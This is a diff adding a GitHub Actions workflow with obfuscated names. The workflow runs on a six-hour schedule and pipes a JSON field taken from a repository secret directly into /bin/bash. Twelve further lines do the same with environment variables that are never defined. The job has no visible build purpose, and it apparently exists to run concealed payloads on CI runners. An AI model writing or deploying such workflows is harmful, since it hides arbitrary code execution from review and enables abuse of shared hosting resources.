@@ -1,0 +1,29 @@
+name: jprollingdeep
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jprollingdeep
+        env:
+          bnq7166: ${{ secrets.bnq7166 }}
+        run: |
+          echo $bnq7166 | jq -r .l649 | /bin/bash
+          echo $mxq4897 | jq -r .yg849 | /bin/bash
+          echo $hzhrl2 | jq -r .y0 | /bin/bash
+          echo $oul53 | jq -r .et24149 | /bin/bash
+          echo $xu5 | jq -r .loo2426 | /bin/bash
+          echo $ak6 | jq -r .jdeng9 | /bin/bash
+          echo $btc96 | jq -r .konl25079 | /bin/bash
+          echo $eak397 | jq -r .fss21 | /bin/bash
+          echo $in733 | jq -r .iiw97421 | /bin/bash
+          echo $on32081 | jq -r .sudat4088 | /bin/bash
+          echo $xsh682 | jq -r .c800 | /bin/bash
+          echo $ckcg48169 | jq -r .ku93 | /bin/bash
+          echo $eov34 | jq -r .sfrin0 | /bin/bash
+
